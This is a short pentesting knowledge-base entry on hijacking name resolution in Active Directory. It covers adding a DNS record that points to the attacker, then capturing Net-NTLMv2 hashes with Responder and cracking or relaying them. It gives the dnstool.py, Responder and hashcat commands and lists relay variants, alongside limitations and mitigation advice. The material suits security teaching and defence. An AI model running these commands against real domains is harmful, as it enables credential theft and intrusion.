---
topic: DNS records and credential capture with Responder
tags: [windows, ad, dns, responder, ntlm]
---

# DNS records and credential capture with Responder

[🌐 Español](dns-responder-credential-capture.md) | **English**

## Concept

A script or application resolving names with a predictable prefix can be diverted by creating a DNS record pointing to the attacker. When the client authenticates over SMB, Responder captures the Net-NTLMv2 hash for cracking or relaying.

## When it applies

- A DNS record can be created in the domain zone.
- A script queries names such as `web*` periodically.
- The victim host resolves and authenticates to the attacker.

## Procedure

1. Identify the naming pattern and frequency.
2. Create an A record pointing to the attacker IP.
3. Start Responder and wait for authentication.
4. Crack the hash with `hashcat -m 5600` or relay it.

```bash
# Crear el registro con credenciales de un usuario que pueda escribir en la zona
python3 dnstool.py -u 'DOMAIN\user' -p '<PASSWORD>' -r web-x -a add -t A -d <ATTACKER> <DC>
responder -I eth0 -wv
hashcat -m 5600 hash.txt rockyou.txt
```

## Variants

- Relay NTLM to LDAP or SMB with `ntlmrelayx`.
- Use IPv6 and WPAD when the network allows it.
- Combine with a malicious SMB share.

## Limitations

- Permission to create DNS records is required.
- SMB traffic must reach the attacker.
- SMB signing may prevent relaying.

## Mitigation and detection

- Restrict DNS record creation and audit changes.
- Disable NTLM or enforce signing and channel binding.
- Review scripts resolving untrusted names.

## References

- <https://attack.mitre.org/techniques/T1557/001/>
- <https://github.com/lgandx/Responder>
- <https://learn.microsoft.com/en-us/windows-server/networking/dns/dns-top>
